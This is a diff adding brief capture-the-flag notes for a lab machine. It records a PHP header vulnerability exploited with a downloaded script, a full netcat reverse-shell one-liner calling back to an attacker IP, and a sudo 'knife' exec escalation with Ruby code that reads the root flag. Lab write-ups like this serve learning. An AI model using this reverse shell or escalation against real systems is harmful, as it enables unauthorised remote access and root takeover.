@@ -1,0 +1,16 @@
+ip = 10.10.10.242
+
+nikto found a vuln in one of the php headers, after googling this, we found an exploit script (see the python file) that allows us to send commands.
+
+this command:
+rm /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.193 9999 >/tmp/f
+Is the useable reverse shell, which allows for better access.
+
+I discovered that the user can run the "Knife" command as Sudo, and after looking at the packages for this command, I saw that it was ruby, and has an option to execute a script via the 'exec' option.  Executing the below code gets root.
+
+
+f = File.open(“/root/root.txt”, “r”)
+f.each_line do |line|
+puts line
+end
+f.close
